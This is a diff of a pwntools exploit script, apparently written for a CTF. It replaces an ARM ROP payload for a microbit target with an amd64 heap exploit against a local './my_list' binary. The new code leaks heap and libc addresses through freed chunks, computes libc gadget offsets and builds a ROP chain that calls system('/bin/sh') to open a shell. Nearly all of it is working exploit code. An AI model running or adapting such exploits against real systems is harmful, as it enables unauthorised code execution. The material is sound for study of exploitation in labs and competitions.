@@ -7,22 +7,14 @@
 # dont forget to set conext.arch. E.g amd64
 
 from pwn import *
-import base64
 
 # Set up pwntools for the correct architecture
-context.update(arch='arm')
-exe = 'qemu-system-arm'
+context.update(arch='amd64')
+exe = './my_list'
 context.terminal = ['tmux', 'new-window']
-argv = ['-s','-machine', 'microbit', '-device', 'loader,file=/ctf/work/tests/test_vuln/bin/microbit/ctf.elf', '-nographic']
+argv = []
 env = {}
-
-elf = ELF("bin/microbit/ctf.elf")
-
-'''
-/home/h0ps/Uni/BachelorArbeit/tests/test_vuln
-
-qemu-system-arm -machine microbit -device loader,file=/home/h0ps/Uni/BachelorArbeit/tests/test_vuln/bin/microbit/ctf.elf -nographic
-'''
+libc = ELF('./libc-2.31.so')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -53,23 +45,12 @@ def start(argv=[], *a, **kw):
     else:
         return remote(argv, *a, **kw)
 
-def decode(data, ln, amnt):
-    buf = b"decode "
-    buf += data
-    buf += b" "
-    buf += str(ln).encode()
-    buf += b" "
-    buf += str(amnt).encode()
-    buf += b" \x0d"
-    io.sendafter("> ", buf)
+def add(data):
+    io.sendlineafter("Enter your choice: ", "1")
+    io.sendlineafter("save: ", data)
 
-def encode(data, ln):
-    buf = b"encode "
-    buf += data
-    buf += b" "
-    buf += str(ln).encode()
-    buf += b" \x0d"
-    io.sendafter("> ", buf)
+def pop():
+    io.sendlineafter("Enter your choice: ", "2")
 
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
@@ -84,19 +65,52 @@ continue
 
 io = start(argv, env=env)
 
-# pop {r0, r1, r4, pc};
-g1 = 0x1cb3
+for i in range(0x8):
+    add("A"*0x100)
 
-buf = b"Z"*0x1a
-rop = base64.b64encode(
-        p32(0x42)*0x6 +
-        p32(g1) +
-        p32(0x10000) + 
-        p32(0x42) +
-        p32(0x42) +
-        p32(elf.sym['puts']))
-buf += rop
-decode(buf, 0x17, 0x2)
+for i in range(0x7):
+    pop()
+
+io.recvuntil("Data: ")
+
+heap_leak = io.recvline()[:6]
+heap_leak = u64(heap_leak.ljust(0x8, b"\x00"))
+
+print(hex(heap_leak))
+
+pop()
+
+io.recvuntil("Data: ")
+
+libc_leak = io.recvline()[:6]
+libc_leak = u64(libc_leak.ljust(0x8, b"\x00"))
+
+libc.address = libc_leak - 0x1ecbe0
+
+print(hex(libc.address))
+
+add_rsp_0x58 = libc.address + 0x10fbc5
+
+buf = p64(add_rsp_0x58)*2
+
+print(hex(libc.sym['system']))
+
+add(buf)
+
+pop_rdi_ret = libc.address + 0x23b72
+
+bin_sh = next(libc.search(b"/bin/sh"))
+
+buf = b"A"*0x10
+buf += p64(pop_rdi_ret)
+buf += p64(bin_sh)
+buf += p64(libc.sym['system'])
+buf = buf.ljust(0x40, b"\x00")
+buf += p64(heap_leak - 0x28)
+
+io.sendlineafter("choice: ", buf)
+
+add("a")
 
 io.interactive()
 
